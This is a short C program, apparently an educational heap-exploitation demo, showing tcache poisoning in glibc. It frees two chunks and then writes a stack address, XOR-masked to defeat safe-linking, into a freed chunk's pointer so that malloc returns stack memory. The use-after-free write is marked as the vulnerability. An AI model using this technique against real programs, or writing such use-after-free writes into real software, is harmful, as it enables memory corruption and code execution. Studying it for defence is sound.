
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
int main()
{
	size_t stack_var[0x10];
	size_t *target = NULL;
	// choose a properly aligned target address
	for (int i = 0; i < 0x10; i++) {
		if (((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}
	assert(target != NULL);
	intptr_t *a = malloc(128);
	intptr_t *b = malloc(128);
	free(a);
	free(b);
	// VULNERABILITY
	// the following operation assumes the address of b is known, which requires a heap leak
	b[0] = (intptr_t)((long)target ^ (long)b >> 12);
	// VULNERABILITY
	malloc(128);
	intptr_t *c = malloc(128);
	assert((long)target == (long)c);
	return 0;
}
